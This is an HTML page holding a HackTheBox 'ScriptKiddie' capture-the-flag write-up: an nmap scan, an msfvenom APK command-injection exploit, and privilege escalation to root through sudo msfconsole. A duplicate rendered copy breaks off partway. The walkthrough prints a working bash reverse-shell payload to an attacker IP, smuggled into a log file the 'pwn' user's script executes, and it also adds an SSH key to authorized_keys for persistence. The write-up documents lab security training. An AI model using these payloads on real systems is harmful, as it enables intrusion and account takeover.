<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ScriptKiddie | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="ScriptKiddie HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/scriptkiddie/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/scriptkiddie/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ScriptKiddie "><meta property="og:description" content="ScriptKiddie HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-06-06T15:15:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png"><meta name=twitter:title content="ScriptKiddie "><meta name=twitter:description content="ScriptKiddie HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"ScriptKiddie ","item":"https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ScriptKiddie ","name":"ScriptKiddie ","description":"ScriptKiddie HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: ScriptKiddie Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap metasploit pwncat Note: IP is different because of release arena (10.10.10.226)\nNetwork enumeration Port and service scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # Nmap 7.91 scan initiated Mon Feb 8 19:00:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.129.77.135 Nmap scan report for 10.129.77.135 Host is up (0.029s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA) | 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA) |_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) | http-methods: |_ Supported Methods: POST HEAD GET OPTIONS |_http-title: k1d'5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Feb 8 19:00:54 2021 -- 1 IP address (1 host up) scanned in 25.42 seconds Web exploitation A python web server (Werkzeug) is running at http://10.129.77.135:5000/.\nThe page is named k1d'5 h4ck3r t00l5 and allow us to use some commands:\nnmap: nmap payloads: msfvenom from metasploit sploits: searchploit from exploit-db On the msfvenom, we have the option to upload a custom template.\nBut there is a new vulnerability:\nThis module exploits a command injection vulnerability in Metasploit Framework’s msfvenom payload generator when using a crafted APK file as an Android payload template. Affects Metasploit Framework \u003c= 6.0.11 and Metasploit Pro \u003c= 4.18.0. The file produced by this module is a relatively empty yet valid-enough APK file. To trigger the vulnerability, the victim user should do the following: msfvenom -p android/\u003c…\u003e -x 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) \u003e options Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME msf.apk yes The APK file name Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port **DisablePayloadHandler: True (no handler will be created!)** Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) \u003e run [+] msf.apk stored at /home/cyfun/.msf4/local/msf.apk Then we select android, specify our template and set whatever a lhost.\nOn our machine we just launch a listener:\n1 2 3 4 5 6 $ pwncat -l 4444 -vv INFO: Listening on :::4444 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:4444 (family 2/IPv4, TCP) INFO: Client connected from 10.129.77.135:43478 (family 2/IPv4, TCP) id uid=1000(kid) gid=1000(kid) groups=1000(kid) System exploitation Let’s see where we are and locate the flag:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ ls -lhA total 20K drwxrwxr-x 2 kid kid 4.0K Feb 3 07:40 __pycache__ -rw-rw-r-- 1 kid kid 4.4K Feb 3 11:03 app.py drwxrwxr-x 3 kid kid 4.0K Feb 3 07:40 static drwxrwxr-x 2 kid kid 4.0K Feb 3 07:40 templates $ pwd /home/kid/html $ ls -lhA .. total 52K lrwxrwxrwx 1 root kid 9 Jan 5 20:31 .bash_history -\u003e /dev/null -rw-r--r-- 1 kid kid 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 kid kid 3.7K Feb 25 2020 .bashrc drwxrwxr-x 3 kid kid 4.0K Feb 3 07:40 .bundle drwx------ 2 kid kid 4.0K Feb 3 07:40 .cache drwx------ 4 kid kid 4.0K Feb 3 11:49 .gnupg drwxrwxr-x 3 kid kid 4.0K Feb 3 07:40 .local drwxr-xr-x 9 kid kid 4.0K Feb 3 07:40 .msf4 -rw-r--r-- 1 kid kid 807 Feb 25 2020 .profile drwx------ 2 kid kid 4.0K Feb 3 07:40 .ssh -rw-r--r-- 1 kid kid 0 Jan 5 11:10 .sudo_as_admin_successful drwxrwxr-x 5 kid kid 4.0K Feb 3 11:03 html drwxrwxrwx 2 kid kid 4.0K Feb 3 07:40 logs drwxr-xr-x 3 kid kid 4.0K Feb 3 11:48 snap -r-------- 1 kid kid 33 Jan 5 20:45 user.txt $ cat ../user.txt # /home/kid/user.txt 4cbc*************************08a Privilege Escalation of Machine : from kid to pwn Let’s find if there is another user flag:\n1 2 kid@scriptkiddie:~$ find / -name user.txt -type f 2\u003e/dev/null /home/kid/user.txt No there isn’t. But we can loot kid’s private key to have a better shell.\n1 2 $ chmod 600 id_rsa_kid $ ssh kid@10.129.77.135 -i id_rsa_kid Note: has been patched, there is no longer some ssh key but we can add ours: printf %s 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' \u003e\u003e /home/kid/.ssh/authorized_keys.\nThere is another user named pwn owning a script: /home/pwn/scanlosers.sh.\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash log=/home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d' ' -f3- | sort -u | while read ip; do sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u003e\u00261 \u003e/dev/null\" \u0026 done if [[ $(wc -l \u003c $log) -gt 0 ]]; then echo -n \u003e $log; fi We have write access to /home/kid/logs/hackers. We can see that our date and IP is written to this file when we try to bypass the searchploit function:\n/home/kid/html/app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 import datetime import os import random import re import subprocess import tempfile import time from flask import Flask, render_template, request from hashlib import md5 from werkzeug.utils import secure_filename regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$') regex_alphanum = re.compile(r'^[A-Za-z0-9 \\.]+$') OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'} app = Flask(__name__) @app.route('/', methods=['GET','POST']) def index(): if request.method == 'GET' or not 'action' in request.form: return render_template('index.html') elif request.form['action'] == 'scan': return scan(request.form['ip']) elif request.form['action'] == 'generate': return venom(request) elif request.form['action'] == 'searchsploit': return searchsploit(request.form['search'], request.remote_addr) print(\"no valid action\") return request.form def scan(ip): if regex_ip.match(ip): if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'): stime = random.randint(200,400)/100 time.sleep(stime) result = f\"\"\"Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime(\"%Y-%m-%d %H:%M\")} UTC\\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds\"\"\".encode() else: result = subprocess.check_output(['nmap', '--top-ports', '100', ip]) return render_template('index.html', scan=result.decode('UTF-8', 'ignore')) return render_template('index.html', scanerror=\"invalid ip\") def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output(['searchsploit', '--color', text]) return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore')) else: with open('/home/kid/logs/hackers', 'a') as f: f.write(f'[{datetime.datetime.now()}] {srcip}\\n') return render_template('index.html', sserror=\"stop hacking me - well hack you back\") def venom(request): errors = [] file = None if not 'lhost' in request.form: errors.append('lhost missing') else: lhost = request.form['lhost'] if not regex_ip.match(lhost): errors.append('invalid lhost ip') if not 'os' in request.form: errors.append('os missing') else: tar_os = request.form['os'] if tar_os not in ['windows', 'linux', 'android']: errors.append(f'invalid os: {tar_os}') if 'template' in request.files and request.files['template'].filename != '': file = request.files['template'] if not ('.' in file.filename and file.filename.split('.')[-1] == OS_2_EXT[tar_os]): errors.append(f'{tar_os} requires a {OS_2_EXT[tar_os]} ext template file') else: template_name = secure_filename(file.filename) template_ext = file.filename.split('.')[-1] template_file = tempfile.NamedTemporaryFile('wb', suffix='.'+template_ext) file.save(template_file.name) else: template_name = \"None\" if errors: return render_template('index.html', payloaderror='\\n'.join(errors)) payload = f'{tar_os}/meterpreter/reverse_tcp' outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + '.' + OS_2_EXT[tar_os] outfilepath = os.path.join(app.root_path, 'static', 'payloads', outfilename) try: if file: print(f'msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444') result = subprocess.check_output(['msfvenom', '-x', template_file.name, '-p', payload, f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath]) template_file.close() else: result = subprocess.check_output(['msfvenom', '-p', payload, f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath]) except subprocess.CalledProcessError: return render_template('index.html', payloaderror=\"Something went wrong\") return render_template('index.html', payload=payload, lhost=lhost, lport=4444, template=template_name, fn=outfilename) if __name__ == '__main__': app.run(host='0.0.0.0') So normally /home/pwn/scanlosers.sh will scan us back.\nThe logs file should contains lines like this one:\n1 2021-02-08 19:54:33.513581 1.1.1.1 And when we try to “hack” searchploit, it voids the file instead of appending a new line.\nThere is /usr/sbin/incrond running so there is maybe a root job starting /home/pwn/scanlosers.sh or something similar.\nLet’s upload and launch pspy to confirm that.\nOn our machine:\n1 2 $ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 $ ruby -run -ehttpd . -p8080 On the target machine:\n1 2 3 kid@scriptkiddie:~$ wget http://10.10.14.135:8080/pspy64 kid@scriptkiddie:~$ chmod u+x pspy64 kid@scriptkiddie:~$ ./pspy64 If we go trigger the searchsploit security filter we can see this on pspy:\n1 2 3 4 5 6 7 8 9 10 11 12 2021/02/08 21:30:37 CMD: UID=1001 PID=2221 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2225 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2226 | sh -c nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2\u003e\u00261 \u003e/dev/null 2021/02/08 21:30:37 CMD: UID=1001 PID=2228 | nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2021/02/08 21:30:37 CMD: UID=1001 PID=2231 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2237 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2236 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=0 PID=2238 | /lib/systemd/systemd-udevd 2021/02/08 21:30:48 CMD: UID=0 PID=2239 | /usr/sbin/incrond 2021/02/08 21:30:48 CMD: UID=1001 PID=2240 | sed -i s/open /closed/g /home/pwn/recon/sed6xfScv 2021/02/08 21:30:48 CMD: UID=0 PID=2241 | /bin/sh /sbin/dhclient-script 2021/02/08 21:30:48 CMD: UID=??? PID=2243 | ??? 1001 is the id of pwn, so we’ll get a shell as pwn.\nLet’s craft a reverse shell payload and put it in place:\n1 $ printf %s \"cyfun cyfun ;/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.135/9999 0\u003e\u00261' #\" \u003e /home/kid/logs/hackers Note: respect the log format else the cut in the script will fails to parse\nOnce injected in /home/pwn/scanlosers.sh the command executed by pwn incron job will be:\n1 nmap --top-ports 10 -oN recon/ ;/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.135/9999 0\u003e\u00261' #.nmap ;/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.135/9999 0\u003e\u00261' # 2\u003e\u00261 \u003e/dev/null Then we start a listener pwncat -l 9999 -vv.\nPrivilege Escalation of Machine : from pwn to root We can root msfconsole as root.\n1 2 3 4 5 6 7 pwn@scriptkiddie:~$ sudo -l Matching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole It will be EZ because we it’s an interpretter where we can directly pass system commands or open irb ruby interpreter.\n1 2 3 4 5 msf6 \u003e cat /root/root.txt stty: 'standard input': Inappropriate ioctl for device [*] exec: cat /root/root.txt 40aa*********************75f ","wordCount":"1737","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png","datePublished":"2021-06-06T15:15:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">ScriptKiddie</h1><div class=post-description>ScriptKiddie HackTheBox writeup</div><div class=post-meta><span title='2021-06-06 15:15:00 +0000 UTC'>June 6, 2021</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1737 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png alt="ScriptKiddie HackTheBox Machine"><p>ScriptKiddie - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#system-exploitation>System exploitation</a></li><li><a href=#privilege-escalation-of-machine--from-kid-to-pwn>Privilege Escalation of Machine : from kid to pwn</a></li><li><a href=#privilege-escalation-of-machine--from-pwn-to-root>Privilege Escalation of Machine : from pwn to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> ScriptKiddie</li><li><strong>Profile:</strong> <a href=https://app.hackthebox.eu/machines/314>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap metasploit pwncat
</span></span></code></pre></td></tr></table></div></div><p>Note: IP is different because of release arena (10.10.10.226)</p><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl># Nmap 7.91 scan initiated Mon Feb  8 19:00:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.129.77.135
</span></span><span class=line><span class=cl>Nmap scan report for 10.129.77.135
</span></span><span class=line><span class=cl>Host is up (0.029s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
</span></span><span class=line><span class=cl>|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
</span></span><span class=line><span class=cl>|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
</span></span><span class=line><span class=cl>5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: POST HEAD GET OPTIONS
</span></span><span class=line><span class=cl>|_http-title: k1d&#39;5 h4ck3r t00l5
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Mon Feb  8 19:00:54 2021 -- 1 IP address (1 host up) scanned in 25.42 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p>A python web server (Werkzeug) is running at http://10.129.77.135:5000/.</p><p>The page is named <code>k1d'5 h4ck3r t00l5</code> and allow us to use some commands:</p><ul><li>nmap: nmap</li><li>payloads: msfvenom from metasploit</li><li>sploits: searchploit from exploit-db</li></ul><p>On the msfvenom, we have the option to upload a custom template.</p><p>But there is a new vulnerability:</p><blockquote><p>This module exploits a command injection vulnerability in Metasploit
Framework&rsquo;s msfvenom payload generator when using a crafted APK file
as an Android payload template. Affects Metasploit Framework &lt;=
6.0.11 and Metasploit Pro &lt;= 4.18.0. The file produced by this
module is a relatively empty yet valid-enough APK file. To trigger
the vulnerability, the victim user should do the following: msfvenom
-p android/&lt;&mldr;> -x &lt;crafted_file.apk></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
</span></span><span class=line><span class=cl>   FILENAME  msf.apk          yes       The APK file name
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload options (cmd/unix/reverse_netcat):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name   Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----   ---------------  --------  -----------
</span></span><span class=line><span class=cl>   LHOST  tun0             yes       The listen address (an interface may be specified)
</span></span><span class=line><span class=cl>   LPORT  4444             yes       The listen port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   **DisablePayloadHandler: True   (no handler will be created!)**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Exploit target:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Id  Name
</span></span><span class=line><span class=cl>   --  ----
</span></span><span class=line><span class=cl>   0   Automatic
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] msf.apk stored at /home/cyfun/.msf4/local/msf.apk
</span></span></code></pre></td></tr></table></div></div><p>Then we select <code>android</code>, specify our template and set whatever a lhost.</p><p>On our machine we just launch a listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ pwncat -l 4444 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::4444 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:4444 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>INFO: Client connected from 10.129.77.135:43478 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>uid=1000(kid) gid=1000(kid) groups=1000(kid)
</span></span></code></pre></td></tr></table></div></div><h2 id=system-exploitation>System exploitation<a hidden class=anchor aria-hidden=true href=#system-exploitation>#</a></h2><p>Let&rsquo;s see where we are and locate the flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ ls -lhA
</span></span><span class=line><span class=cl>total 20K
</span></span><span class=line><span class=cl>drwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 __pycache__
</span></span><span class=line><span class=cl>-rw-rw-r-- 1 kid kid 4.4K Feb  3 11:03 app.py
</span></span><span class=line><span class=cl>drwxrwxr-x 3 kid kid 4.0K Feb  3 07:40 static
